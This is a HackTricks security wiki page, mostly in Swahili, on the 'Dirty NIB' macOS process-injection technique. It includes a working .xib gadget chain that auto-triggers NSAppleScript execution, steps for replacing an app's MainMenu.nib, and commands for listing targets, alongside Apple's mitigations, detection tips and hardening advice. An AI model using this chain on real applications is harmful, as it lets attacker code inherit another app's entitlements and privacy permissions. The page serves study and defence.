# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB refers to abusing Interface Builder files (.xib/.nib) inside a signed macOS app bundle to execute attacker-controlled logic inside the target process, thereby inheriting its entitlements and TCC permissions. This technique was originally documented by xpn (MDSec) and later generalized and significantly expanded by Sector7, who also covered Apple’s mitigations in macOS 13 Ventura and macOS 14 Sonoma. For background and deep dives, see the references at the end.

> TL;DR
> • Kabla ya macOS 13 Ventura: kubadilisha bundle’s MainMenu.nib (au nib nyingine inayopakiwa wakati wa kuanzisha) inaweza kwa uhakika kufanikisha process injection na mara nyingi privilege escalation.
> • Tangu macOS 13 (Ventura) na iliboreka katika macOS 14 (Sonoma): first‑launch deep verification, bundle protection, Launch Constraints, na ruhusa mpya ya TCC “App Management” kwa kiasi kikubwa zinazuia uharibifu wa nib baada ya uzinduzi na programu zisizohusiana. Shambulio bado yanaweza kutendeka katika matukio maalum (mfano, zana za developer mmoja zinazobadilisha programu zao wenyewe, au terminals zilizotolewa App Management/Full Disk Access na mtumiaji).

## NIB/XIB files ni nini

Nib (fupi kwa NeXT Interface Builder) files ni serialized UI object graphs zinazotumika na AppKit apps. Xcode ya kisasa inahifadhi editable XML .xib files ambazo zinakusanywa kuwa .nib wakati wa build. App ya kawaida inapakia UI yake kuu kupitia `NSApplicationMain()` ambayo inasoma `NSMainNibFile` key kutoka Info.plist ya app na kutengeneza object graph wakati wa runtime.

Mambo muhimu yanayowezesha shambulio:
- NIB loading huinstantiate arbitrary Objective‑C classes bila kuhitaji ya kubadilisha kuwa NSSecureCoding (Apple’s nib loader inarudi kwenye `init`/`initWithFrame:` wakati `initWithCoder:` haipatikani).
- Cocoa Bindings zinaweza kutumiwa vibaya kuita methods wakati nib zinatengenezwa, ikijumuisha wito mfululizo ambao hauhitaji mwingiliano wa mtumiaji.

## Dirty NIB injection process (mtazamo wa mshambuliaji)

Mtiririko wa kawaida kabla ya Ventura:
1) Create a malicious .xib
- Add an `NSAppleScript` object (or other “gadget” classes such as `NSTask`).
- Add an `NSTextField` whose title contains the payload (e.g., AppleScript or command arguments).
- Add one or more `NSMenuItem` objects wired via bindings to call methods on the target object.

2) Auto‑trigger without user clicks
- Use bindings to set a menu item’s target/selector and then invoke the private `_corePerformAction` method so the action fires automatically when the nib loads. This removes the need for a user to click a button.

Minimal example of an auto‑trigger chain inside a .xib (abridged for clarity):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Hii inaruhusu utekelezaji wa AppleScript wowote katika mchakato lengwa wakati nib inapopakuliwa. Mnyororo za juu zinaweza:
- Kuanzisha darasa lolote la AppKit (mf., `NSTask`) na kuita methods zisizo na hoja kama `-launch`.
- Kuita selectors yoyote zenye object arguments kupitia the binding trick iliyoelezwa hapo juu.
- Pakia AppleScriptObjC.framework ili kufungua bridge kuelekea Objective‑C na hata kuita selected C APIs.
- Katika mifumo ya zamani ambayo bado ina Python.framework, tengeneza bridge kuelekea Python kisha tumia `ctypes` kuita function za C yoyote (Sector7’s research).

3) Replace the app’s nib
- Nakili target.app kwenda eneo linaloweza kuandikwa, badilisha mf., `Contents/Resources/MainMenu.nib` na nib yenye madhuni, kisha endesha target.app. Pre‑Ventura, baada ya tathmini ya Gatekeeper mara moja, uzinduzi uliofuata ulifanya tu ukaguzi mdogo wa saini, hivyo rasilimali zisizo za executable (kama .nib) hazikufanyiwa uhakiki tena.

Example AppleScript payload for a visible test:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia)

Apple ilianzisha mbinu kadhaa za kimfumo ambazo zinapunguza kwa kiasi kikubwa uwezekano wa Dirty NIB kwenye macOS ya kisasa:
- First‑launch deep verification and bundle protection (macOS 13 Ventura)
- Katika utekelezaji wa kwanza wa programu yoyote (iliyokatwa au la), ukaguzi wa kina wa saini unafunika rasilimali zote za bundle. Baada yake, bundle inakuwa iliyo salama: programu pekee kutoka kwa msanidi mmoja (au zilizoruhusiwa wazi na programu) zinaweza kubadilisha yaliyomo. Programu nyingine zinahitaji ruhusa mpya ya TCC “App Management” ili kuandika ndani ya bundle ya programu nyingine.
- Launch Constraints (macOS 13 Ventura)
- System/Apple‑bundled apps can’t be copied elsewhere and launched; this kills the “copy to /tmp, patch, run” approach for OS apps.
- Improvements in macOS 14 Sonoma
- Apple hardened App Management and fixed known bypasses (e.g., CVE‑2023‑40450) noted by Sector7. Python.framework was removed earlier (macOS 12.3), breaking some privilege‑escalation chains.
- Gatekeeper/Quarantine changes
- Kwa mazungumzo mapana kuhusu Gatekeeper, provenance, na assessment — na mabadiliko yao ambayo yameathiri tekniki hii, angalia ukurasa uliorejelewa hapa chini.

> Athari za vitendo
> • Kwenye Ventura+ kwa kawaida huwezi kubadilisha .nib ya programu ya mtu wa tatu isipokuwa mchakato wako una App Management au umewekwa saini na Team ID ile ile kama lengo (mfano, developer tooling).
> • Kumpa App Management au Full Disk Access kwa shells/terminals kwa ufanisi kunafungua tena uso huu wa shambulio kwa chochote kinachoweza kukimbiza code ndani ya muktadha wa terminal hiyo.


### Kushughulikia Launch Constraints

Launch Constraints zinazuia kuendesha programu nyingi za Apple kutoka maeneo yasiyo ya default kuanzia Ventura. Ikiwa ulitegemea mtiririko wa kabla ya Ventura kama kunakili programu ya Apple kwenye directory ya muda, kubadilisha `MainMenu.nib`, na kuianzisha, tarajia hiyo itashindwa kwenye >= 13.0.


## Kuroodhesha malengo na nibs (useful for research / legacy systems)

- Tafuta programu ambazo UI yao inaendeshwa na nib‑driven:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Pata rasilimali za nib zinazowezekana ndani ya bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Thibitisha code signatures kwa kina (itafeli ikiwa umeingilia rasilimali na hukusaini upya):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Kumbuka: Kwenye macOS ya kisasa utazuiwa pia na ulinzi wa bundle/TCC unapotaka kuandika kwenye bundle ya app nyingine bila idhini sahihi.


## Uchunguzi na vidokezo vya DFIR

- Ufuatiliaji wa uadilifu wa faili kwenye rasilimali za bundle
- Angalia mabadiliko ya mtime/ctime ya `Contents/Resources/*.nib` na rasilimali nyingine zisizo za kutekeleza katika programu zilizowekwa.
- Logi zilizounganishwa na tabia za michakato
- Fuatilia utekelezaji usiotarajiwa wa AppleScript ndani ya apps za GUI na kwa michakato inayoipakia AppleScriptObjC au Python.framework. Mfano:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Tathmini za kuzuia
- Fanya mara kwa mara `codesign --verify --deep` kwenye apps muhimu ili kuhakikisha rasilimali zinabaki zikiwa kamili.
- Muktadha wa ruhusa
- Chunguza nani/nini kina TCC “App Management” au Full Disk Access (hasa terminals na maagent wa usimamizi). Kuondoa hizi kutoka kwa shells za matumizi ya jumla kunazuia kwa urahisi kuruhusu tena uharibifu wa aina ya Dirty NIB.


## Kuthibitisha kinga (waendelezaji na walinzi)

- Pendelea UI ya programatiki au punguza yale yanayotengenezwa kutoka kwa nibs. Epuka kujumuisha madarasa yenye uwezo mkubwa (mf., `NSTask`) katika grafu za nib na epuka bindings zinazoiita kwa njia isiyo ya moja kwa moja selectors kwenye vitu vilivyobinafsishwa.
- Kubali hardened runtime pamoja na Library Validation (tayari ni kawaida kwa apps za kisasa). Ingawa hii haitazuia nib injection yenyewe, inazuia upakiaji rahisi wa native code na inawalazimisha wadukuzi kutumia payloads za scripting pekee.
- Usiombe au utegemee vibali vya App Management vya pana katika zana za matumizi ya jumla. Ikiwa MDM inahitaji App Management, tengeneza muktadha huo tofauti na shells zinazotumiwa na watumiaji.
- Thibitisha mara kwa mara uadilifu wa bundle ya app yako na fanya mifumo yako ya masasisho iweze kujirekebisha rasilimali za bundle.


## Related reading in HackTricks

Jifunze zaidi kuhusu Gatekeeper, quarantine na mabadiliko ya provenance yanayoathiri teknik hii:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- xpn – DirtyNIB (mwandiko wa awali na mfano wa Pages): https://blog.xpnsec.com/dirtynib/
- Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (5 Aprili, 2024): https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/

{{#include ../../../banners/hacktricks-training.md}}
